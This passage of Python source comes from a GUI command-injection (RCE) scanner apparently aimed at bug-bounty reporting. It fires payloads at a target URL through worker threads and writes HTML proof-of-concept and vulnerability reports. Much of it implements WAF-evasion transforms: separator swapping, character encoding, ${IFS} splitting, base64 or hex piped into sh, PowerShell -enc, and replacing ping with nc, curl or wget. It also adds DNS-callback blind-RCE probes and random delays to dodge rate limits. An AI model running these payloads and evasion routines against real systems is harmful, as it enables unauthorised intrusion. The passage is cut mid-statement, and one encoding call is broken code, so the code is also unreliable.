        <p><strong>参数:</strong> {self.get_current_param()}</p>
        <p><strong>请求方法:</strong> {vuln['method']}</p>
        <p><strong>数据格式:</strong> {vuln['data_format']}</p>
        <p><strong>状态码:</strong> {vuln['status_code']}</p>
        <p><strong>响应时间:</strong> {vuln['response_time']:.2f}秒</p>
        <p><strong>漏洞类型:</strong> {vuln['type']}</p>
        <p><strong>状态:</strong> {vuln['status']}</p>
    </div>
    
    <div class="poc-box">
        <h2>POC验证</h2>
        <p><strong>利用Payload:</strong></p>
        <div class="payload">{vuln['payload']}</div>
        
        <p><strong>漏洞描述:</strong></p>
        <p>{vuln['description']}</p>
    </div>
    
    <div class="poc-box">
        <h2>复现步骤</h2>
        <ol>
            <li>向 {vuln['url']} 发送包含上述Payload的请求</li>
            <li>请求方法: {vuln['method']}</li>
            <li>参数名: {self.get_current_param()}</li>
            <li>数据格式: {vuln['data_format']}</li>
            <li>检查响应内容，确认命令已执行</li>
        </ol>
        
        <h2>修复建议</h2>
        <ul>
            <li>避免将用户输入直接传递给命令执行函数</li>
            <li>使用白名单限制允许执行的命令和参数</li>
            <li>对用户输入进行严格的过滤和验证</li>
            <li>使用最小权限原则运行应用程序</li>
            <li>考虑使用API替代直接的系统命令调用</li>
        </ul>
    </div>
</body>
</html>"""
    
    def generate_and_download_report(self):
        """生成SRC漏洞报告并下载到指定路径"""
        if not self.vulnerabilities:
            messagebox.showwarning("警告", "没有发现漏洞，无法生成报告")
            return
            
        # 获取选中的漏洞
        selected_items = self.vuln_tree.selection()
        if not selected_items:
            # 如果没有选中，生成所有漏洞的报告
            self.generate_complete_report()
            return
            
        # 使用选中的漏洞生成单个漏洞报告
        item = selected_items[0]
        vuln_id = int(self.vuln_tree.item(item, "values")[0])
        vuln = next(v for v in self.vulnerabilities if v['id'] == vuln_id)
        
        # 获取下载路径
        download_dir = self.download_path.get()
        if not os.path.exists(download_dir):
            messagebox.showwarning("警告", "下载路径不存在，将使用默认路径")
            download_dir = "reports"
            self.ensure_directory(download_dir)
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        file_name = f"rce_report_{vuln['id']}_{timestamp}.html"
        file_path = os.path.join(download_dir, file_name)
        
        # 构建报告内容
        report_content = self.generate_single_vuln_report(vuln)
        
        try:
            with open(file_path, "w", encoding="utf-8") as f:
                f.write(report_content)
            
            # 记录到下载历史
            self.add_to_download_history(file_name, "报告", file_path)
            
            self.log(f"SRC漏洞报告已下载到: {file_path}", "success")
            
            # 询问是否打开报告文件
            if messagebox.askyesno("报告生成成功", f"报告已保存到 {file_path}\n是否立即打开?"):
                webbrowser.open(f"file://{os.path.abspath(file_path)}")
        except Exception as e:
            self.log(f"生成报告失败: {str(e)}", "error")
    
    def generate_single_vuln_report(self, vuln):
        """生成单个漏洞的详细报告"""
        severity = self.get_vulnerability_severity(vuln)
        severity_class = severity.replace('风险', '').lower()
        
        return f"""<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>RCE漏洞详细报告 - 漏洞 #{vuln['id']}</title>
    <style>
        body {{ font-family: SimHei, Arial, sans-serif; margin: 20px; line-height: 1.6; color: #333; }}
        .header {{ background-color: #f8f9fa; padding: 20px; border-radius: 5px; margin-bottom: 20px; }}
        .vulnerability {{ border: 1px solid #ddd; border-radius: 5px; padding: 15px; margin: 15px 0; }}
        .severity {{ display: inline-block; padding: 5px 10px; border-radius: 3px; font-size: 0.9em; font-weight: bold; }}
        .high {{ background-color: #f8d7da; color: #721c24; }}
        .medium {{ background-color: #fff3cd; color: #856404; }}
        .low {{ background-color: #d1ecf1; color: #0c5460; }}
        .payload {{ background-color: #f8f9fa; padding: 10px; border-radius: 3px; font-family: monospace; word-break: break-all; overflow-x: auto; white-space: pre-wrap; }}
        .section {{ margin-bottom: 20px; }}
        h1, h2, h3 {{ color: #2c3e50; }}
        table {{ width: 100%; border-collapse: collapse; margin: 15px 0; }}
        table, th, td {{ border: 1px solid #ddd; }}
        th, td {{ padding: 12px; text-align: left; }}
        th {{ background-color: #f2f2f2; }}
    </style>
</head>
<body>
    <div class="header">
        <h1>RCE漏洞详细报告</h1>
        <p>报告ID: RCE-{datetime.now().strftime("%Y%m%d%H%M%S")}</p>
        <p>测试日期: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}</p>
        <p>目标系统: {self.target_url.get()}</p>
    </div>
    
    <div class="section">
        <h2>漏洞信息 <span class="severity {severity_class}">{severity}</span></h2>
        
        <div class="vulnerability">
            <h3>漏洞 #{vuln['id']}</h3>
            <p><strong>受影响URL:</strong> {vuln['url']}</p>
            <p><strong>测试参数:</strong> {self.get_current_param()}</p>
            <p><strong>请求方法:</strong> {vuln['method']}</p>
            <p><strong>数据格式:</strong> {vuln['data_format']}</p>
            <p><strong>触发Payload:</strong></p>
            <div class="payload">{vuln['payload']}</div>
            <p><strong>响应状态码:</strong> {vuln['status_code']}</p>
            <p><strong>响应时间:</strong> {vuln['response_time']:.2f}秒</p>
            <p><strong>漏洞类型:</strong> {vuln['type']}</p>
            <p><strong>状态:</strong> {vuln['status']}</p>
        </div>
    </div>
    
    <div class="section">
        <h2>漏洞描述</h2>
        <p>{vuln['description']}</p>
        <p>RCE（远程代码执行）漏洞允许攻击者在目标服务器上执行任意命令，可能导致服务器被完全控制、数据泄露或进一步渗透到内部网络。</p>
    </div>
    
    <div class="section">
        <h2>验证方法</h2>
        <ol>
            <li>使用{ vuln['method'] }方法向 {vuln['url']} 发送请求</li>
            <li>在{ self.get_current_param() }参数中包含上述Payload</li>
            <li>使用{ vuln['data_format'] }格式提交数据</li>
            <li>观察服务器响应，确认命令已成功执行</li>
        </ol>
    </div>
    
    <div class="section">
        <h2>风险影响</h2>
        <ul>
            <li>服务器完全受控：攻击者可执行任意命令，获取服务器控制权</li>
            <li>数据泄露：可读取、修改或删除服务器上的敏感数据</li>
            <li>横向渗透：可能利用漏洞攻击内网其他系统</li>
            <li>服务中断：可执行破坏性命令导致服务不可用</li>
            <li>权限提升：可能通过漏洞获取更高系统权限</li>
        </ul>
    </div>
    
    <div class="section">
        <h2>修复建议</h2>
        <ol>
            <li>避免直接使用用户输入构造系统命令</li>
            <li>实施严格的输入验证和过滤，使用白名单机制</li>
            <li>使用安全的API替代系统命令执行函数</li>
            <li>采用最小权限原则配置应用程序运行账户</li>
            <li>实施命令执行审计日志，记录所有命令执行操作</li>
            <li>定期更新和修补系统及应用程序漏洞</li>
            <li>考虑使用应用程序防火墙(WAF)防护此类攻击</li>
        </ol>
    </div>
</body>
</html>"""
    
    def generate_complete_report(self):
        """生成包含所有漏洞的完整报告"""
        if not self.vulnerabilities:
            messagebox.showwarning("警告", "没有发现漏洞，无法生成报告")
            return
            
        # 获取下载路径
        download_dir = self.download_path.get()
        if not os.path.exists(download_dir):
            messagebox.showwarning("警告", "下载路径不存在，将使用默认路径")
            download_dir = "reports"
            self.ensure_directory(download_dir)
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        file_name = f"rce_complete_report_{timestamp}.html"
        file_path = os.path.join(download_dir, file_name)
        
        # 构建报告内容
        report_content = self.generate_full_report_content()
        
        try:
            with open(file_path, "w", encoding="utf-8") as f:
                f.write(report_content)
            
            # 记录到下载历史
            self.add_to_download_history(file_name, "报告", file_path)
            
            self.log(f"完整SRC漏洞报告已下载到: {file_path}", "success")
            
            # 询问是否打开报告文件
            if messagebox.askyesno("报告生成成功", f"完整报告已保存到 {file_path}\n是否立即打开?"):
                webbrowser.open(f"file://{os.path.abspath(file_path)}")
        except Exception as e:
            self.log(f"生成完整报告失败: {str(e)}", "error")
    
    def generate_full_report_content(self):
        """生成包含所有漏洞的完整报告内容"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        report_content = f"""<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>RCE漏洞完整报告 - {timestamp}</title>
    <style>
        body {{ font-family: SimHei, Arial, sans-serif; margin: 20px; line-height: 1.6; color: #333; }}
        .header {{ background-color: #f8f9fa; padding: 20px; border-radius: 5px; margin-bottom: 20px; }}
        .vulnerability {{ border: 1px solid #ddd; border-radius: 5px; padding: 15px; margin: 15px 0; }}
        .severity {{ display: inline-block; padding: 3px 8px; border-radius: 3px; font-size: 0.8em; font-weight: bold; }}
        .high {{ background-color: #f8d7da; color: #721c24; }}
        .medium {{ background-color: #fff3cd; color: #856404; }}
        .low {{ background-color: #d1ecf1; color: #0c5460; }}
        .payload {{ background-color: #f8f9fa; padding: 10px; border-radius: 3px; font-family: monospace; word-break: break-all; overflow-x: auto; white-space: pre-wrap; }}
        .section {{ margin-bottom: 20px; }}
        h1, h2, h3 {{ color: #2c3e50; }}
        table {{ width: 100%; border-collapse: collapse; margin: 15px 0; }}
        table, th, td {{ border: 1px solid #ddd; }}
        th, td {{ padding: 12px; text-align: left; }}
        th {{ background-color: #f2f2f2; }}
    </style>
</head>
<body>
    <div class="header">
        <h1>RCE漏洞完整报告</h1>
        <p>报告ID: RCE-{timestamp}</p>
        <p>测试日期: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}</p>
        <p>目标系统: {self.target_url.get()}</p>
    </div>
    
    <div class="section">
        <h2>摘要</h2>
        <p>本次测试共发现 {len(self.vulnerabilities)} 个潜在的RCE漏洞。RCE（远程代码执行）漏洞允许攻击者在目标服务器上执行任意命令，可能导致服务器被完全控制、数据泄露或进一步渗透。</p>
        
        <h3>漏洞统计</h3>
        <table>
            <tr>
                <th>风险等级</th>
                <th>数量</th>
                <th>说明</th>
            </tr>
            <tr>
                <td><span class="severity high">高风险</span></td>
                <td>{sum(1 for v in self.vulnerabilities if self.get_vulnerability_severity(v) == "高风险")}</td>
                <td>可直接执行命令，危害严重</td>
            </tr>
            <tr>
                <td><span class="severity medium">中风险</span></td>
                <td>{sum(1 for v in self.vulnerabilities if self.get_vulnerability_severity(v) == "中风险")}</td>
                <td>盲RCE漏洞，可通过时间延迟或外部交互验证</td>
            </tr>
            <tr>
                <td><span class="severity low">低风险</span></td>
                <td>{sum(1 for v in self.vulnerabilities if self.get_vulnerability_severity(v) == "低风险")}</td>
                <td>存在潜在风险但利用难度较高</td>
            </tr>
        </table>
    </div>
    
    <div class="section">
        <h2>漏洞详情 ({len(self.vulnerabilities)})</h2>
"""
        for vuln in self.vulnerabilities:
            # 评估漏洞严重程度
            severity = self.get_vulnerability_severity(vuln)
            severity_class = severity.replace('风险', '').lower()
            
            report_content += f"""
        <div class="vulnerability">
            <h3>漏洞 #{vuln['id']} <span class="severity {severity_class}">{severity}</span></h3>
            <p><strong>受影响URL:</strong> {vuln['url']}</p>
            <p><strong>测试参数:</strong> {self.get_current_param()}</p>
            <p><strong>请求方法:</strong> {vuln['method']}</p>
            <p><strong>数据格式:</strong> {vuln['data_format']}</p>
            <p><strong>触发Payload:</strong></p>
            <div class="payload">{vuln['payload']}</div>
            <p><strong>响应状态码:</strong> {vuln['status_code']}</p>
            <p><strong>响应时间:</strong> {vuln['response_time']:.2f}秒</p>
            <p><strong>漏洞类型:</strong> {vuln['type']}</p>
            <p><strong>状态:</strong> {vuln['status']}</p>
            <p><strong>漏洞描述:</strong> {vuln['description']}</p>
        </div>
"""
        
        report_content += f"""
    </div>
    
    <div class="section">
        <h2>验证方法</h2>
        <ol>
            <li>使用相应的HTTP方法向目标URL发送请求</li>
            <li>在指定参数中包含测试Payload</li>
            <li>使用适当的数据格式提交请求</li>
            <li>观察服务器响应，确认命令已执行</li>
            <li>对于盲RCE，通过时间延迟或回调确认漏洞存在</li>
        </ol>
    </div>
    
    <div class="section">
        <h2>风险影响</h2>
        <ul>
            <li>服务器完全受控：攻击者可执行任意命令，获取服务器控制权</li>
            <li>数据泄露：可读取、修改或删除服务器上的敏感数据</li>
            <li>横向渗透：可能利用漏洞攻击内网其他系统</li>
            <li>服务中断：可执行破坏性命令导致服务不可用</li>
            <li>权限提升：可能通过漏洞获取更高系统权限</li>
        </ul>
    </div>
    
    <div class="section">
        <h2>修复建议</h2>
        <ol>
            <li>避免直接使用用户输入构造系统命令</li>
            <li>实施严格的输入验证和过滤，使用白名单机制</li>
            <li>使用安全的API替代系统命令执行函数</li>
            <li>采用最小权限原则配置应用程序运行账户</li>
            <li>实施命令执行审计日志，记录所有命令执行操作</li>
            <li>定期更新和修补系统及应用程序漏洞</li>
            <li>考虑使用应用程序防火墙(WAF)防护此类攻击</li>
        </ol>
    </div>
    
    <div class="section">
        <h2>报告生成信息</h2>
        <p>本报告由RCE漏洞利用工具自动生成，测试结果仅供参考，建议进行人工验证。</p>
        <p>生成时间: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}</p>
    </div>
</body>
</html>"""
        return report_content
    
    def batch_download_pocs(self):
        """批量下载所有POC"""
        if not self.vulnerabilities:
            messagebox.showwarning("警告", "没有发现漏洞，无法生成POC")
            return
            
        # 获取下载路径
        download_dir = self.download_path.get()
        if not os.path.exists(download_dir):
            messagebox.showwarning("警告", "下载路径不存在，将使用默认路径")
            download_dir = os.path.join("pocs", f"batch_{datetime.now().strftime('%Y%m%d_%H%M%S')}")
        else:
            download_dir = os.path.join(download_dir, f"rce_pocs_{datetime.now().strftime('%Y%m%d_%H%M%S')}")
            
        self.ensure_directory(download_dir)
        
        # 生成所有POC
        success_count = 0
        for vuln in self.vulnerabilities:
            try:
                file_name = f"rce_poc_{vuln['id']}.html"
                file_path = os.path.join(download_dir, file_name)
                
                # 构建POC内容
                poc_content = self.generate_poc_content(vuln)
                
                with open(file_path, "w", encoding="utf-8") as f:
                    f.write(poc_content)
                
                # 记录到下载历史
                self.add_to_download_history(file_name, "POC", file_path)
                success_count += 1
            except Exception as e:
                self.log(f"生成POC #{vuln['id']} 失败: {str(e)}", "error")
        
        self.log(f"批量生成完成，成功生成 {success_count}/{len(self.vulnerabilities)} 个POC", "success")
        
        # 询问是否打开文件夹
        if messagebox.askyesno("批量生成完成", f"已成功生成 {success_count} 个POC到 {download_dir}\n是否打开文件夹?"):
            webbrowser.open(f"file://{os.path.abspath(download_dir)}")
    
    def package_all_downloads(self):
        """打包所有POC和报告为ZIP文件"""
        if not self.vulnerabilities:
            messagebox.showwarning("警告", "没有发现漏洞，无法生成文件")
            return
            
        # 获取下载路径
        download_dir = self.download_path.get()
        if not os.path.exists(download_dir):
            messagebox.showwarning("警告", "下载路径不存在，将使用默认路径")
            download_dir = "."
            
        # 创建临时目录
        temp_dir = f"rce_package_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        self.ensure_directory(temp_dir)
        self.ensure_directory(os.path.join(temp_dir, "pocs"))
        self.ensure_directory(os.path.join(temp_dir, "reports"))
        
        # 生成所有POC
        for vuln in self.vulnerabilities:
            try:
                file_name = f"rce_poc_{vuln['id']}.html"
                file_path = os.path.join(temp_dir, "pocs", file_name)
                
                with open(file_path, "w", encoding="utf-8") as f:
                    f.write(self.generate_poc_content(vuln))
            except Exception as e:
                self.log(f"生成POC #{vuln['id']} 失败: {str(e)}", "error")
        
        # 生成完整报告
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            file_name = f"rce_vulnerability_report_{timestamp}.html"
            file_path = os.path.join(temp_dir, "reports", file_name)
            
            with open(file_path, "w", encoding="utf-8") as f:
                f.write(self.generate_full_report_content())
        except Exception as e:
            self.log(f"生成报告失败: {str(e)}", "error")
        
        # 创建ZIP文件
        zip_file_name = f"rce_package_{timestamp}.zip"
        zip_file_path = os.path.join(download_dir, zip_file_name)
        
        try:
            with zipfile.ZipFile(zip_file_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                # 添加POC文件
                for root, dirs, files in os.walk(os.path.join(temp_dir, "pocs")):
                    for file in files:
                        file_path = os.path.join(root, file)
                        arcname = os.path.relpath(file_path, temp_dir)
                        zipf.write(file_path, arcname)
                
                # 添加报告文件
                for root, dirs, files in os.walk(os.path.join(temp_dir, "reports")):
                    for file in files:
                        file_path = os.path.join(root, file)
                        arcname = os.path.relpath(file_path, temp_dir)
                        zipf.write(file_path, arcname)
            
            # 清理临时文件
            shutil.rmtree(temp_dir)
            
            # 记录到下载历史
            self.add_to_download_history(zip_file_name, "打包文件", zip_file_path)
            
            self.log(f"所有文件已打包为ZIP: {zip_file_path}", "success")
            
            # 询问是否打开文件夹
            if messagebox.askyesno("打包完成", f"所有文件已打包为ZIP并保存到 {zip_file_path}\n是否打开文件夹?"):
                webbrowser.open(f"file://{os.path.abspath(download_dir)}")
                
        except Exception as e:
            self.log(f"打包文件失败: {str(e)}", "error")
    
    # WAF绕过技术实现
    def obfuscate_delimiters(self, payload):
        """命令分隔符混淆 - 使用不同的命令分隔符"""
        delimiters = [';', '|', '&&', '||', '&', '|', ';', '&&', '||', ' %0A ', ' %0D ', ' %00 ']
        if any(d in payload for d in [';', '|', '&']):
            # 随机替换分隔符
            for d in [';', '|', '&', '&&', '||']:
                if d in payload:
                    replacement = random.choice([x for x in delimiters if x != d])
                    payload = payload.replace(d, replacement)
        else:
            # 如果没有分隔符，尝试添加一个
            if ' ' in payload:
                parts = payload.split(' ', 1)
                payload = f"{parts[0]}{random.choice(delimiters)}{parts[1]}"
        return payload
    
    def encode_special_chars(self, payload):
        """特殊字符编码 - 使用URL编码、HTML实体等"""
        # 只编码特定字符
        char_map = {
            ' ': ['%20', '+', '%09', '%0A', '%0D'],
            ';': ['%3B', '&#59;', '&#x3b;'],
            '|': ['%7C', '&#124;', '&#x7c;'],
            '&': ['%26', '&#38;', '&#x26;'],
            '(': ['%28', '&#40;', '&#x28;'],
            ')': ['%29', '&#41;', '&#x29;'],
            '/': ['%2F', '&#47;', '&#x2f;'],
            '`': ['%60', '&#96;', '&#x60;'],
            '$': ['%24', '&#36;', '&#x24;']
        }
        
        encoded = []
        for c in payload:
            if c in char_map and random.choice([True, False]):
                encoded.append(random.choice(char_map[c]))
            else:
                encoded.append(c)
        return ''.join(encoded)
    
    def random_case(self, payload):
        """大小写混淆 - 随机改变命令字母的大小写"""
        # 只对命令部分进行大小写混淆
        commands = ['id', 'whoami', 'cat', 'ls', 'dir', 'ping', 'echo', 'system', 'exec']
        
        for cmd in commands:
            if cmd in payload.lower():
                # 随机改变字母大小写
                obfuscated = ''.join([
                    c.upper() if random.choice([True, False]) else c.lower()
                    for c in cmd
                ])
                # 使用正则替换，不区分大小写
                payload = re.sub(re.escape(cmd), obfuscated, payload, flags=re.IGNORECASE)
        
        return payload
    
    def insert_null_chars(self, payload):
        """空字符插入 - 在命令中插入空字符或注释"""
        techniques = [
            # 插入空字符
            lambda p: re.sub(r'(\w+)', r'\1%00', p),
            # 插入注释
            lambda p: re.sub(r'(\w+)', r'\1#comment', p),
            # 插入空格和注释
            lambda p: re.sub(r'(\w+)', r'\1 /*comment*/', p)
        ]
        return random.choice(techniques)(payload)
    
    def split_commands(self, payload):
        """命令拼接 - 将命令拆分为多个部分拼接执行"""
        # 适用于支持变量的shell环境
        if ' ' in payload and len(payload) > 5:
            parts = payload.split(' ', 1)
            cmd = parts[0]
            args = parts[1]
            
            # 随机选择一种拼接方式
            techniques = [
                f"{cmd}${{IFS}}{args}",
                f"{cmd}$IFS{args}",
                f"{cmd} `echo -n ' '` {args}",
                f"$(echo {cmd} | base64 -d) {args}",
                f"`echo {cmd} | base64 -d` {args}"
            ]
            return random.choice(techniques)
        return payload
    
    def alternative_commands(self, payload):
        """替代命令 - 使用功能相似的替代命令"""
        replacements = {
            'cat': ['more', 'less', 'head', 'tail', 'nl', 'sed', 'awk'],
            'ls': ['dir', 'echo *', 'ls -la', 'ls --color=none'],
            'id': ['whoami', 'groups', 'id -u', 'id -g'],
            'ping': ['nc', 'telnet', 'curl', 'wget']
        }
        
        for cmd, alternatives in replacements.items():
            if cmd in payload:
                # 随机替换为替代命令
                payload = payload.replace(cmd, random.choice(alternatives))
        return payload
    
    def variable_substitution(self, payload):
        """变量替换 - 使用环境变量替换部分命令"""
        substitutions = {
            'cat': '${CAT:-cat}',
            'ls': '${LS:-ls}',
            'id': '${ID:-id}',
            '/': '${IFS%??}'
        }
        
        for original, substitution in substitutions.items():
            if original in payload and random.choice([True, False]):
                payload = payload.replace(original, substitution)
        return payload
    
    def encode_bypass(self, payload):
        """编码绕过 - 使用Base64等编码执行命令"""
        # 只对完整命令进行编码
        if ' ' in payload and not any(c in payload for c in ['base64', 'decod']):
            # 随机选择编码方式
            target_os = self.target_os.get()
            techniques = []
            
            if target_os in ['linux', 'both']:
                # Linux base64编码
                encoded = payload.encode().hex()
                techniques.append(f"echo {encoded} | xxd -r -p | sh")
                
                encoded = payload.encode().base64().decode().strip()
                techniques.append(f"echo {encoded} | base64 -d | sh")
            
            if target_os in ['windows', 'both']:
                # Windows PowerShell编码
                encoded = payload.encode('utf-16le').hex()
                techniques.append(f"powershell -enc {encoded}")
        
            if techniques:
                return random.choice(techniques)
        return payload
    
    def parameter_pollution(self, payload):
        """HTTP参数污染 - 通过重复参数绕过过滤"""
        # 只在有参数时使用
        param = self.get_current_param()
        if param:
            return f"{payload}&{param}="
        return payload
    
    def newline_bypass(self, payload):
        """换行符绕过 - 在命令中插入换行符"""
        if ' ' in payload:
            # 随机位置插入换行符
            pos = random.randint(1, len(payload)-1)
            return payload[:pos] + '%0A' + payload[pos:]
        return payload
    
    def bypass_waf_techniques(self, payload):
        """应用WAF绕过技术处理payload"""
        # 获取启用的绕过技术
        enabled_techniques = []
        tech_mapping = {
            "命令分隔符混淆": self.obfuscate_delimiters,
            "特殊字符编码": self.encode_special_chars,
            "大小写混淆": self.random_case,
            "空字符插入": self.insert_null_chars,
            "命令拼接": self.split_commands,
            "替代命令": self.alternative_commands,
            "变量替换": self.variable_substitution,
            "编码绕过": self.encode_bypass,
            "HTTP参数污染": self.parameter_pollution,
            "换行符绕过": self.newline_bypass
        }
        
        for tech_name, var in self.waf_checkbuttons.items():
            if var.get():
                enabled_techniques.append(tech_mapping[tech_name])
        
        if not enabled_techniques:
            return payload
        
        # 深度模式下应用更多绕过技术
        num_techniques = random.randint(2, 4) if self.intensive_mode.get() else random.randint(1, min(2, len(enabled_techniques)))
        
        chosen_techniques = random.sample(enabled_techniques, num_techniques)
        
        modified_payload = payload
        for technique in chosen_techniques:
            modified_payload = technique(modified_payload)
            
        return modified_payload
    
    # 测试核心功能
    def create_session(self):
        """创建带有重试机制的会话"""
        session = requests.Session()
        retry = Retry(
            total=3,
            backoff_factor=0.5,
            status_forcelist=[500, 502, 503, 504]
        )
        adapter = HTTPAdapter(max_retries=retry)
        session.mount('http://', adapter)
        session.mount('https://', adapter)
        return session
    
    def worker(self):
        """工作线程，处理队列中的payload测试任务"""
        session = self.create_session()
        
        while not self.stop_testing and not self.queue.empty():
            payload, payload_index, total_payloads = self.queue.get()
            try:
                self.log(f"测试payload {payload_index}/{total_payloads}", "info")
                self.test_rce_payload(session, payload)
                
                # 随机延迟，避免触发WAF的速率限制
                if self.random_delay.get():
                    time.sleep(random.uniform(0.5, 2.0))
            except Exception as e:
                self.log(f"测试payload时出错: {str(e)}", "error")
            finally:
                self.queue.task_done()
    
    def start_testing(self):
        """开始测试RCE漏洞"""
        target = self.target_url.get().strip()
        param = self.get_current_param()
        
        # 验证输入
        if not target or not param:
            messagebox.showwarning("警告", "请输入目标URL并选择测试参数")
            return
            
        if self.testing_in_progress:
            messagebox.showinfo("提示", "测试正在进行中")
            return
            
        # 准备测试环境
        self.testing_in_progress = True
        self.stop_testing = False
        self.vulnerabilities = []
        self.result_text.delete(1.0, tk.END)
        
        # 更新按钮状态和状态标签
        self.start_button.config(state=tk.DISABLED)
        self.stop_button.config(state=tk.NORMAL)
        self.status_label.config(text="测试中...", foreground="orange")
        
        # 确保URL格式正确
        if not re.match(r"^https?://", target):
            target = f"http://{target}"
        
        self.log("开始RCE漏洞测试...", "info")
        self.log(f"目标URL: {target}", "info")
        self.log(f"测试参数: {param}", "info")
        self.log(f"请求方法: {self.request_method.get()}", "info")
        self.log(f"数据格式: {self.data_format.get()}", "info")
        
        # 记录启用的WAF绕过技术
        enabled_techs = [name for name, var in self.waf_checkbuttons.items() if var.get()]
        self.log(f"启用的WAF绕过技术: {', '.join(enabled_techs) or '无'}", "info")
        self.log(f"深度测试模式: {'启用' if self.intensive_mode.get() else '禁用'}", "info")
        
        # 获取payloads
        payloads_text = self.payload_text.get(1.0, tk.END).strip()
        payloads = [p.strip() for p in payloads_text.split('\n') if p.strip()]
        
        # 如果启用盲RCE测试，添加盲RCE payload
        if self.test_blind.get():
            callback = self.callback_url.get().strip()
            delay = self.delay_threshold.get().strip()
            try:
                delay = int(delay) if delay else 3
            except:
                delay = 3
                
            if callback:
                # 添加DNS回调解密payload
                dns_payloads = [
                    f"nslookup {callback}",
                    f"dig {callback}",
                    f"ping -c 1 {callback}",
                    f"nslookup {callback} 8.8.8.8"
                ]
                payloads.extend(dns_payloads)
                self.log(f"已添加盲RCE DNS回调解密payload，回调地址: {callback}", "info")
            
            # 添加时间延迟payload
            time_payloads = [
                f"ping -c {delay} 127.0.0.1",  # Linux
                f"ping -n {delay} 127.0.0.1",  # Windows
                f"sleep {delay}",              # Linux
                f"timeout /t {delay}"          # Windows
            ]
            payloads.extend(time_payloads)
            self.log(f"已添加盲RCE时间延迟payload，延迟阈值: {delay}秒", "info")
        
        if not payloads:
            self.log("没有可用的payload，测试中止", "error")
            self.cleanup_testing()
            return
            
        total_payloads = len(payloads)
        self.log(f"共加载 {total_payloads} 个payload，开始测试...", "info")
        
        # 填充任务队列
        for i, payload in enumerate(payloads, 1):
            self.queue.put((payload, i, total_payloads))
        
        # 启动工作线程
        try:
            thread_count = int(self.thread_count.get())
            if thread_count < 1 or thread_count > 10:
                raise ValueError("线程数必须在1-10之间")
        except ValueError:
            thread_count = 3
            self.log(f"无效的线程数，使用默认值: {thread_count}", "warning")
        
        self.threads = []
        for _ in range(thread_count):
            t = threading.Thread(target=self.worker)
            t.daemon = True
            t.start()
            self.threads.append(t)
        
        # 监控线程完成情况
        def monitor_threads():
            for t in self.threads:
                t.join()
            self.log("所有测试任务已完成！", "info")
            if self.vulnerabilities:
                self.log(f"共发现 {len(self.vulnerabilities)} 个潜在的RCE漏洞", "success")
                self.update_vulnerability_list()
                # 自动切换到结果标签页
                self.tab_control.select(2)
            else:
                self.log("未发现明显的RCE漏洞", "info")
            self.cleanup_testing()
        
        threading.Thread(target=monitor_threads, daemon=True).start()
    
    def stop_testing_action(self):
        """停止当前测试"""
        if not self.testing_in_progress:
            return
            
        self.log("正在停止测试...", "warning")
        self.stop_testing = True
        self.status_label.config(text="停止中...", foreground="orange")
    
    def cleanup_testing(self):
        """清理测试环境"""
        self.testing_in_progress = False
        self.stop_testing = False
        self.start_button.config(state=tk.NORMAL)
        self.stop_button.config(state=tk.DISABLED)
        self.status_label.config(text="就绪", foreground="green")
    
    def test_rce_payload(self, session, payload):
        """测试单个RCE payload"""
        if self.stop_testing:
            return
            
        try:
            target = self.target_url.get().strip()
            param = self.get_current_param()
            method = self.request_method.get()
            data_format = self.data_format.get()
            
            if not re.match(r"^https?://", target):
                target = f"http://{target}"
            
            # 应用WAF绕过技术
            bypassed_payload = self.bypass_waf_techniques(payload)
            
            # 构建请求数据
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                "Connection": "close"
            }
            
            # 根据数据格式设置不同的Content-Type
            if data_format == "json":
                headers["Content-Type"] = "application/json"
            elif data_format == "xml":
                headers["Content-Type"] = "application/xml"
            else:  # form
                headers["Content-Type"] = "application/x-www-form-urlencoded"
            
            # 设置代理
            proxies = None
            proxy_val = self.proxy.get().strip()
            if proxy_val:
                proxies = {"http": proxy_val, "https": proxy_val}
            
            # 构建请求数据
            if data_format == "json":
                import json
                data = json.dumps({param: bypassed_payload})
            elif data_format == "xml":
                data = f"<{param}>{bypassed_payload}</{param}>"
            else:  # form
                data = f"{param}={bypassed_payload}"
            
            # 发送请求
            start_time = time.time()
            
            try:
                if method == "GET":
                    # GET请求将参数添加到URL
                    from urllib.parse import urlparse, urlencode, parse_qs
                    parsed_url = urlparse(target)
                    query_params = parse_qs(parsed_url.query)
                    query_params[param] = [bypassed_payload]
                    new_query = urlencode(query_params, doseq=True)
                    test_url = parsed_url._replace(query=new_query).geturl()
                    
                    response = session.get(
                        test_url,
                        headers=headers,
                        proxies=proxies,
                        timeout=int(self.timeout.get()),
                        verify=False,
                        allow_redirects=False
                    )
                else:
                    # POST或PUT请求
                    response = session.request(
                        method,
                        target,
                        data=data,
                        headers=headers,
                        proxies=proxies,
                        timeout=int(self.timeout.get()),
                        verify=False,
                        allow_redirects=False
                    )
                
                response_time = time.time() - start_time
                status_code = response.status_code
                response_text = response.text
                
                # 分析响应，判断是否存在RCE漏洞
                is_vulnerable, vuln_type, description = self.analyze_response(
                    response_text, bypassed_payload, response_time)
                
                if is_vulnerable:
                    vuln_info = {
                        "id": len(self.vulnerabilities) + 1,
                        "url": target,
                        "payload": bypassed_payload,
                        "method": method,
                        "data_format": data_format,
                        "status_code": status_code,
                        "response_time": response_time,
                        "type": vuln_type,
                        "status": "已确认",
                        "description": description
                    }
                    self.vulnerabilities.append(vuln_info)
                    self.log(f"发现潜在RCE漏洞: {vuln_type}", "success")
                else:
                    # 检查是否是盲RCE payload
                    callback = self.callback_url.get().strip()
                    delay_threshold = int(self.delay_threshold.get() or 3)
                    
                    # 检测时间延迟型盲RCE
                    if response_time > delay_threshold and (
                        'sleep' in bypassed_payload or 
